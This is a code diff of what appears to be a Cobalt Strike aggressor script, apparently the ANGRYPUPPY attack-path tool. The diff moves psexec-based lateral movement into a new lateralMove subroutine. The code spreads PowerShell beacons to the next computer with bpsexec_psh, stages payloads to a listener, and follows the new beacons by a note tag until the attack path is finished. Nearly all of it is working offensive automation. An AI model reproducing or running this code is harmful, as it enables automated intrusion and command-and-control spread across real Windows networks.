@@ -302,6 +302,39 @@ sub getToken {
     }
 }
 
+sub lateralMove {
+    #PSEXEC here
+    if ($psexec eq $False){
+        bpsexec_psh($currentBid, $nextLabel, $listener);
+        $psexec = $True;
+        #bpause($1, 10000);
+        bstage($1, $null, $listener);
+    }
+
+    if ($waitFor eq $nextLabel) {
+        # We got the beacon back and change the bid to the new one
+        foreach $session (beacons()) {
+            $comp = $session["computer"];
+            $note = $session["note"];
+            if (($comp eq $nextLabel) && ($note eq "ANGRYPUPPY" . $randomPuppy)) {
+                $currentBid = $session["id"];
+                break;
+            }
+        }
+        if (binfo($currentBid,"computer") eq $nextLabel){
+            # All good to go
+            $pos = $pos + 1;
+            $psexec = $False;
+
+        }
+    }
+    else if ($waitFor ne "") {
+        # Error occured, let's reset waitFor
+        $waitFor = "";
+        println("Error: WaitFor override with wrong beacon");
+    }
+}
+
 sub executeAttack {
     println("[*] Executing after 5s");
     # Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
@@ -311,36 +344,7 @@ sub executeAttack {
     if (@final[$pos + 1]["type"] eq "Computer"){
         println("[LATERAL] : $nextLabel");
 
-        #PSEXEC here
-        if ($psexec eq $False){
-            bpsexec_psh($currentBid, $nextLabel, $listener);
-            $psexec = $True;
-            #bpause($1, 10000);
-            bstage($1, $null, $listener);
-        }
-
-        if ($waitFor eq $nextLabel) {
-            # We got the beacon back and change the bid to the new one
-            foreach $session (beacons()) {
-                $comp = $session["computer"];
-                $note = $session["note"];
-                if (($comp eq $nextLabel) && ($note eq "ANGRYPUPPY" . $randomPuppy)) {
-                    $currentBid = $session["id"];
-                    break;
-                }
-            }
-            if (binfo($currentBid,"computer") eq $nextLabel){
-                # All good to go
-                $pos = $pos + 1;
-                $psexec = $False;
-
-            }
-        }
-        else if ($waitFor ne "") {
-            # Error occured, let's reset waitFor
-            $waitFor = "";
-            println("Error: WaitFor override with wrong beacon");
-        }
+        lateralMove();
 
     }
     else {
@@ -373,7 +377,7 @@ sub executeAttack {
     if ($pos eq (size(@final) - 1)){
         # Finished attack path
 
-        elog("[*] Attack finished");
+        elog("[*] Attack finished: $randomPuppy");
         $attackActive = $False;
     }
 }
